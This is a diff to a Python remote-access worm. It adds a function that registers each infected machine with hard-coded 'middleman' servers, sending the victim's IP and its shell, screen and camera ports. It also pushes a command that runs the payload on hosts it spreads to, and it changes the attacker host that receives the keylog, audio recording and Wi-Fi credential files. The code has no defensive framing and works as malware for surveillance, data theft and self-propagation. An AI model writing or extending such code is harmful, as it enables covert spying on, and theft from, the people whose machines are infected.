@@ -404,10 +404,12 @@ class NetworkScanner:
                     # Send payload
                     s.sendall(self.payload)
                     
-                    # Notify middleman about new victim
-                    self.notify_middleman(host)
-                    
                     print(f"Successfully spread to {host}")
+                    
+                    # Execute payload on remote host
+                    command = f"python3 {__file__} --host 0.0.0.0 --port {self.target_ports[0]}"
+                    s.send(command.encode())
+                    
                     return True
                     
         except Exception as e:
@@ -516,8 +518,62 @@ def start_spreading():
             time.sleep(5)
 
 
+def connect_to_middleman():
+    """Try to connect to available middleman servers"""
+    middleman_hosts = [
+        '10.0.2.15',      # NAT default middleman
+        '192.168.56.1',   # Host-only default middleman
+        '192.168.1.15',   # Bridge mode middleman
+        '10.0.3.15'       # NAT Network middleman
+    ]
+    middleman_port = 8080
+
+    # Get local IP address
+    local_ip = None
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        local_ip = s.getsockname()[0]
+        s.close()
+    except:
+        # If can't get IP, try alternative method
+        hostname = socket.gethostname()
+        local_ip = socket.gethostbyname(hostname)
+
+    if not local_ip:
+        print("Could not determine local IP")
+        return
+
+    # Try to connect to each middleman
+    for middleman_ip in middleman_hosts:
+        try:
+            conn = HTTPConnection(middleman_ip, middleman_port, timeout=1)
+            headers = {'Content-type': 'application/json'}
+            data = {
+                'victim_ip': local_ip,
+                'ports': {
+                    'shell': 5000,
+                    'screen': 5001,
+                    'camera': 5002
+                }
+            }
+            conn.request('POST', '/new_victim', json.dumps(data), headers)
+            response = conn.getresponse()
+            if response.status == 200:
+                print(f"Successfully connected to middleman at {middleman_ip}")
+                return True
+        except Exception as e:
+            print(f"Failed to connect to middleman at {middleman_ip}: {e}")
+            continue
+    return False
+
+
 if __name__ == "__main__":
     options = parseargs()
+    
+    # Try to connect to middleman first
+    connect_to_middleman()
+    
     if options.keylog == "t":
         logging.basicConfig(filename="Keylog.txt", level=logging.DEBUG, format="%(asctime)s: %(message)s")
         threadlog = threading.Thread(target=keylog)
@@ -540,11 +596,16 @@ if __name__ == "__main__":
         MAX_IMAGE_DGRAM = MAX_DGRAM - 64
         threadcam = threading.Thread(target=camsender, args=(options.port + 2,))
         threadcam.start()
-    attacker_host = '192.168.1.13'
-    file_transfer_port = options.port + 3
-    files_to_send = ["Keylog.txt", "record.wav", "wifis.txt"]
+    
+    # Start spreading thread
     spreading_thread = threading.Thread(target=start_spreading, daemon=True)
     spreading_thread.start()
+
+    # File transfer setup
+    attacker_host = '192.168.1.15'
+    file_transfer_port = options.port + 3
+    files_to_send = ["Keylog.txt", "record.wav", "wifis.txt"]
+    
     while True:
         try:
             with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
@@ -555,4 +616,3 @@ if __name__ == "__main__":
                 break
         except Exception as e:
             time.sleep(5)
-    # Start spreading thread
